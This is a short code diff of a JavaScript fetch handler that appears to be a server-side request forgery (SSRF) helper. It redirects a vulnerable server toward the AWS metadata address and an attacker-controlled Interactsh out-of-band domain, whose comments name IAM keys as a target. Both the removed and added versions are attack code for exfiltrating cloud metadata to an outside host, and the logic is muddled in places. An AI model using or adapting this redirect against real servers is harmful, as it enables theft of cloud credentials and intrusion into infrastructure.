@@ -1,11 +1,10 @@
 export default {
   async fetch(request) {
-    // Step 1: Redirect the VULNERABLE SERVER to AWS metadata
-    // const awsUrl = "http://169.254.169.254/latest/meta-data/hostname";
-    const awsUrl = "https://api.ipify.org";
-    
-    // Step 2: Force the server to include AWS data in the URL path/params
-    const interactshUrl = "https://bjgibppjensgmxvguqwdm2xp3ddbjdtag.oast.fun";
-    return Response(`${encodeURIComponent(interactshUrl)}/${awsUrl}`, 302);
+    // Step 1: Extract the AWS metadata path (e.g., hostname, IAM keys)
+    const awsPath = "169-254-169-254.latest.meta-data.hostname"; // DNS-safe format
+    const attackerDomain = "bjgibppjensgmxvguqwdm2xp3ddbjdtag.oast.fun"; // Your Interactsh domain
+
+    // Step 2: Redirect to a crafted DNS subdomain
+    return Response.redirect(`http://${awsPath}.${attackerDomain}`, 302);
   }
 };
